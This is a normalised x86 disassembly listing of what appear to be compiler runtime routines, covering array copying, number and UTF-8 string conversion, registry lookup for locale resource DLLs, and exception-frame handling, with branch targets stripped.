jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404704
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404b5c
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028f0
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404c90
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404b74
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4058c0
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_405238
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402850
sub_404c90
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40403c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404704
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404b5c
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404c90
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404b74
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4058c0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_405238
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402850
sub_404d90
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_404834
mov edx eax
mov ecx esi
mov eax ebx
call sub_404d84
pop edx
pop esi
pop ebx
retn
sub_404db4
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_4042a8
mov ecx eax
mov eax esp
mov edx ebx
call sub_404728
mov eax [ esp ]
pop edx
pop ebx
retn
sub_404de0
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404e04
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402a7c
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402a7c
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404de0
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_405064
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40505c
jmp r-xdata
mov al 0x4
call sub_402850
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402850
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_402734
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026f4
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402c84
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404a64
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028f0
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402c84
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_405044
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_405064
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4051fc
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_402714
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404a64
sub_405238
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_4051fc
pop edx
pop eax
sub_405260
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_401304
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405290
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_401294
mov eax esp
mov dl 0x1
call sub_4054cc
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4052d8
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405290
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405314
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_40129c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_4012a4
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405300
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405300
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405300
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4054cc
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_401294
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012ec
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4055d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405314
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012f4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012ec
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012e4
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012f4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012ec
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_4012b4
push eax
call sub_40128c
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_40576c
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_402714
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_402714
jmp r-xdata
sub_4057cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405807
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405838
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40589c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4057cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4058a3
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4058c0
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4058ec
test edx edx
je sub_4058a8
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402850
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405990
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4059b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405a94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405bcc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fe8
mov eax ebx
xor edx edx
call sub_404840
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c72
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax ebx
call sub_404834
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404634
mov eax ebx
call sub_404834
push eax
mov eax [ ebp - 0x4 ]
call sub_4042a8
inc eax
push eax
mov eax ebx
call sub_404824
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a8
pop ecx
pop edx
call sub_4059b8
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fe8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404634
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40403c
sub_405c78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405d0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4046c8
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d16
lea eax [ ebp - 0x4 ]
call sub_4046c8
retn
mov eax ebx
call sub_4042a8
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404910
mov eax ebx
call sub_4042a8
push eax
mov eax [ ebp - 0x4 ]
call sub_404834
inc eax
push eax
mov eax ebx
call sub_4044a8
push eax
mov eax [ ebp - 0x4 ]
call sub_404824
pop ecx
pop edx
call sub_405a94
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4046c8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404910
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404704
sub_405d1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405d5f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404814
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405bcc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d66
lea eax [ ebp - 0x4 ]
call sub_4046c8
retn
sub_405d6c
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4041e0
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4052d8
push eax
call sub_4012c4
mov ecx eax
mov edx esp
mov eax esi
call sub_4040d8
jmp r-xdata
sub_405dc4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405e2a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_40128c
